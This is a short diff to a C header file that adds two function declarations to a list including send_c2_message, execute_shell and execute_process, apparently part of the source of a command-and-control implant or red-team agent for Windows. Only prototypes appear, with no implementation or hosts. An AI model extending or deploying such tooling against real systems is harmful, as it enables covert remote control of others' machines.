@@ -29,6 +29,9 @@ char *base64_encode(const unsigned char *src, size_t len);
 char *base64_decode(const char *src, size_t len);
 unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len);
 char *send_c2_message(const char *json_msg);
+char *read_pipe_output(HANDLE hRead, HANDLE hProcess);
+int grant_winsta_desktop_access(const char *username, const char *domain,
+                                char *desktop_out, size_t desktop_out_len);
 char *execute_shell(const char *cmd);
 char *execute_process(const char *executable, const char *arguments);
 char *ConsoleOutputToUTF8(const char *input);
